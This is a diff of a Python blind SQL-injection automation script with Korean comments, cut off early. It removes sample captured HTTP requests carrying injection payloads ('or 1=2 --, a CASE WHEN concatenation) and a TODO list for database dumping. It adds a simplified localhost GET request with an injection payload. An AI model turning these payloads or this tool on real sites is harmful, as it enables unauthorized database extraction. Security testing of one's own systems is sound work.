@@ -1,81 +1,22 @@
-####################
-# 추가로 만들 옵션
-# 1. Request 입력한 파일 값 받아오기
-# 2. DB, TABLE, COLUMN 외 데이터 출력 구현
-# 3. 다른 데이터베이스 페이로드 생성 # !! MYSQL, ORACLE 완료
-# 4. --dump 덤프 옵션 추가
-####################
-
-# -*- coding: utf-8 -*-   
-from time import sleep
+# 과거 버전 참고용. 현재 실행은 루트 sqli.py를 사용하세요.
 import sys
-import urllib
+import urllib.parse
 import requests
 import warnings
 import argparse
 import sqlite3
-import json
-warnings.filterwarnings('ignore')
+from time import sleep
 
-# 전역변수
-output_check = False
-args = None
-false_message_size = None # 거짓(False)의 경우 message size
-
-
-#########################################################################################################
-############################################### JSON 타입 ###############################################
-
+length = 20
+start_row = 1
+max_row = 1000
+max_len = 20
+sleep_time = 0
 REQUEST_STRING = """
-POST /api/login HTTP/1.1
-Host: 192.168.219.100:5001
-Content-Length: 44
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
-Content-Type: application/json
-Accept: */*
-Origin: http://192.168.219.100:5001
-Referer: http://192.168.219.100:5001/
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-Connection: keep-alive
-
-{"username":"'or 1=2 -- ","password":"1234"}
-"""
-
-# ############################################### GET 방식 ###############################################
-
-REQUEST_STRING = """
-GET /?username='or+1=2+--+&password=1 HTTP/1.1
-host: 192.168.219.100:5001
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.219.100:5001/?username=&password=
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-Connection: keep-alive
+GET /?username=example'+and+1=2+--+ HTTP/1.1
+Host: 127.0.0.1:5001
 
 """
-
-############################################### POST 방식 ###############################################
-
-# REQUEST_STRING = """
-# POST / HTTP/1.1
-# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-# Accept-Encoding: gzip, deflate, br
-# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-# Connection: keep-alive
-# host: 192.168.219.100:5001
-# Accept-Language: ko-KR,ko;q=0.9
-# Upgrade-Insecure-Requests: 1
-# Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
-# Content-Type: application/x-www-form-urlencoded
-# Content-Length: 83
-
-# username='%7C%7C(case+when+1=2+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
-# """
-
-########################################################################################################
-
-
 
 class Colors:
 	""" ANSI color codes """
